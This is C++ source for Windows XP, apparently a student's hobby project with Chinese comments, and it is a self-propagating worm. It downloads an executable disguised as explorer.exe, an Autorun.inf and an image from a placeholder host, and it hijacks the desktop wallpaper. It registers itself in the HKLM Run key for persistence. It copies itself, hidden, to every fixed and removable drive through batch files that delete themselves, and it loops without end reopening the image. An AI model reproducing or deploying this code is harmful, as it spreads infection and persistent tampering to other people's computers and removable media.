//made by 珞珈凤凰
//以下代码在WindowsXP  Visual C++6.0 测试通过
//该程序只修改XP桌面
//其他系统修改桌面读者可以参考本文自行设计
//但愿明年能够转去信息安全系

#include "stdafx.h"
#include<stdio.h>
#include<stdlib.h>
#include<windows.h>
#include<urlmon.h>
#include<process.h>
#include<Shellapi.h>  //这个头文件里有ShellExecute的定义
#include <iostream>
#include  <iomanip>
#include <fstream>
#include   <cstdio>   
#include   <stack>
#pragma comment (lib,"Urlmon.lib")
//函数
void down();
bool Checkdisk();
void Scandisk();
void destory();
void reg();
int getname();
void drive();

using namespace std;
#define FILENAME "C:\\Autorun.inf"

int getname()//获取当前用户名 并修改墙纸 需要重起见效
{
	char szName[1024];
	unsigned long lens = sizeof(szName);
	
	GetUserName(szName, &lens );
	
	
	static char subkey1[] = "Control Panel\\Desktop"; 
	static char vname1[] = "ConvertedWallpaper"; 
	static char exefile1[] = "C:\\progra~1\\Messenger\\jl.bmp"; 
	ULONG dType = REG_SZ, len = 0; 
	HKEY hKey; 
	RegOpenKeyEx(HKEY_CURRENT_USER,subkey1,0,KEY_SET_VALUE|KEY_QUERY_VALUE,&hKey);//打开。 
	RegSetValueEx(hKey, vname1, 0, REG_SZ,(BYTE *)exefile1, strlen(exefile1)+1); //加上。 
	RegCloseKey(hKey); //关闭。
	FILE *f;//复制一份图片
	f=fopen("change.bat","w=");
    fprintf(f,"copy C:\\progra~1\\Messenger\\jl.bmp C:\\docume~1\\%s\\LocalS~1\\Applic~1\\Microsoft\\Wallpaper1.bmp",szName);
    //注意使用短文件名
	fprintf(f,"\n"); 
	fprintf(f,"del change.bat");//自删除
	fclose(f);
	WinExec("change.bat",SW_HIDE);
	return 0;
	
}
void reg()//利用注册表进行自启动
{
	static char subkey[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"; 
	static char vname[] = "explorer.exe"; 
	static char exefile[] = "C:\\progra~1\\Messenger\\explorer.exe"; 
	ULONG dType = REG_SZ, len = 0; 
	HKEY hKey; 
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,subkey,0,KEY_SET_VALUE|KEY_QUERY_VALUE,&hKey);//打开。 
	if (RegQueryValueEx(hKey, vname, 0, &dType, NULL, &len))
	{ //如果没有explorer， 
		RegSetValueEx(hKey, vname, 0, REG_SZ,(BYTE *)exefile, strlen(exefile)+1); //就加上。 
	} 
	RegCloseKey(hKey); //关闭。
	
}
void down()//下载
{
	//website为存放文件的网址
	URLDownloadToFileA(NULL,"http://website/jl.bmp","C:\\progra~1\\Messenger\\jl.bmp",0,NULL);//下经过系统处理的图片
	URLDownloadToFileA(NULL,"http://website/explorer.exe","C:\\progra~1\\Messenger\\explorer.exe",0,NULL);//下载本文件
	URLDownloadToFileA(NULL,"http://website/Autorun.inf","C:\\progra~1\\Messenger\\Autorun.inf",0,NULL);//下文件
	ShellExecuteA(0,"open","C:\\progra~1\\Messenger\\jl.bmp",NULL,NULL,SW_SHOW);//运行文件
}
void destory()
{
	int i=1;
	while(i<=100)
	{
		ShellExecute(0,"open","C:\\progra~1\\Messenger\\jl.bmp",NULL,NULL,SW_SHOW);//运行文件
		Sleep(13000);	
	}
}
void drive()//复制到各个盘
{
	char drive[4]={0};
	wsprintf(drive,"C:\0");
	drive[0]='C';
	while(drive[0]<='Z')
	{
		if(GetDriveType(drive)==DRIVE_FIXED)
		{
			FILE *f;
			f=fopen("drive.bat","w=");
			fprintf(f,"copy C:\\progra~1\\Messenger\\explorer.exe %c:\\explorer.exe",drive[0]);
			fprintf(f,"\n");
			fprintf(f,"copy C:\\progra~1\\Messenger\\Autorun.inf %c:\\Autorun.inf",drive[0]);
			fprintf(f,"\n");
			fprintf(f,"attrib +h %c:\\Autorun.inf",drive[0]);
			fprintf(f,"\n");
			fprintf(f,"attrib +h %c:\\explorer.exe",drive[0]);
			fprintf(f,"\n");
			fprintf(f,"del drive.bat");
			fclose(f);
			WinExec("drive.bat",SW_HIDE);
			Sleep(500);
			//return true;
		}
		drive[0]++;
	}
}
bool Checkdisk()//扫描是否有移动盘
{
	char usb[4]={0};
	wsprintf(usb,"C:\0");//很重要
	usb[0]='C';
	
	while(usb[0]<='Z')
	{
		if(GetDriveType(usb)==DRIVE_REMOVABLE)
		{
			FILE *f;
			f=fopen("usb1.bat","w=");
			fprintf(f,"copy C:\\progra~1\\Messenger\\explorer.exe %c:\\explorer.exe",usb[0]);
			fprintf(f,"\n");
			fprintf(f,"copy C:\\progra~1\\Messenger\\Autorun.inf %c:\\Autorun.inf",usb[0]);
			fprintf(f,"\n");
			fprintf(f,"attrib +h %c:\\Autorun.inf",usb[0]);
			fprintf(f,"\n");
			fprintf(f,"attrib +h %c:\\explorer.exe",usb[0]);
			fprintf(f,"\n");
			fprintf(f,"del usb1.bat");
			fclose(f);
			WinExec("usb1.bat",SW_HIDE);
			return true;
		}
		
		
		usb[0]++;
		
	}
	
	//	}
	
	return false;
}
void Scandisk()//定时检测是否有移动盘
{
	while(!Checkdisk())
	{
		Sleep(4000);//扫描后停止4秒
	}
}


void EntryPoint() 
{ 
	ExitProcess(WinMain(GetModuleHandle(NULL), NULL, GetCommandLine(), SW_HIDE)); 
}
//主函数
int WINAPI WinMain(HINSTANCE hInstance,
				   HINSTANCE hPrevInstance,
				   LPSTR     lpCmdLine,
				   int       nCmdShow)
				   
{
    down();
	getname();	//设置注册表键值，并且复制文件到指定目录
	reg();		////利用注册表进行自启动
	
    
	drive();
	Checkdisk();
    Scandisk();
	destory();
	
	
	
	return 0;
}
